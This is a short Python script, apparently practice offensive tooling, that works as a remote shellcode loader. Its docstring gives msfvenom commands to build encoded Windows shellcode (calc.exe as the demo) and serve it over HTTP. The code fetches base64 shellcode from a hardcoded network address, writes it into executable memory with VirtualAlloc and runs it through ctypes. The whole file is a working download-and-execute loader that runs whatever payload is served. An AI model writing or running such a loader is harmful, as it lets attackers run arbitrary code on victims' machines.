"""
A simple shellcode execution server
- Works on a vulnerable unprotected system
- used with Metasploits msfvenom

- msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe > shellcode.raw
- base64 -w 0 -i shellcode.raw > shellcode.bin
- python -m http.server 8100
"""
from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    print("I'm Inside the run function")
    buffer = ctypes.create_string_buffer(shellcode)
    print(f"buffer -> {buffer}")
    ptr = write_memory(buffer)
    print(f"This is the pointer -> {ptr}")
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()
    
if __name__ == '__main__':
    url = "http://192.168.0.104:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
    
